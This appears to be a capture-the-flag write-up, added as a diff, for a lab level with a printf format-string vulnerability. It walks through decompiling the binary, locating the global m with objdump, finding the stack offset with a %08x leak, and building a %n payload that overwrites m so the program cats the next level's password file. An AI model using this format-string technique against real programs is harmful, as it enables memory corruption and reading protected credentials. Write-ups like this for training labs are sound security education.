@@ -1,0 +1,54 @@
+As usual we use scp and Ghidra to decompilate the program.
+scp -r  -P 4242 level4@192.168.56.102:/home/user/level4 .
+
+then we get this part of code:
+
+void p(char *param_1)
+
+{
+  printf(param_1);
+  return;
+}
+
+
+
+void n(void)
+
+{
+  char local_20c [520];
+  
+  fgets(local_20c,0x200,stdin);
+  p(local_20c);
+  if (m == 0x1025544) {
+    system("/bin/cat /home/user/level5/.pass");
+  }
+  return;
+}
+
+it's the same as the precedent level but this time m should be equal to 16930116 but there is a protection on fgets so we cannot inject a string this long directly to fgets (max size of the buffer is 512).
+
+so we need to make printf change the value of m as before with passing a string < 512 bytes.
+ first we get the address of m with objdump:
+ objdump -t ./level4 | grep m
+
+08049810 g     O .bss	00000004              m
+
+we get the address 0x08049810 for m.
+Then we need to find the emplacement of the block memory the stack:
+python -c 'print "AAAA" + "|%08x" * 18' | ./level4
+
+AAAA|b7ff26b0|bffff774|b7fd0ff4|00000000|00000000|bffff738|0804848d|bffff530|00000200|b7fd1ac0|b7ff37d0|41414141|3830257c|30257c78|257c7838|7c783830|78383025|3830257c
+
+we can the a pattern repetition in 12th emplacement (41414141).
+
+The 00000000 values indicate that printf encountered null values on the stack when trying to retrieve the missing arguments. Null values in memory or on the stack can occur for various reasons, such as uninitialized variables or unused portions of memory. In this case, it seems that the missing arguments were not properly provided, leading to the printing of the null values.
+
+Then we have to put the address of m in little endian: "\x10\x98\x04\x08"
+
+%16930112x: This specifies a format specifier that controls the width of the output. In this case, 16930112 is the width of the output field, indicating how many characters should be printed. The x indicates that the value should be printed in lowercase hexadecimal format.
+
+To complain the if condition we need m = 16930116 bytes. so we have to make 16930116 - 4 (addr).
+
+So now we have: address + 16930112 bytes => we placed the result of %n in the 12th block of memory:
+
+(python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' ; cat) | ./level4 
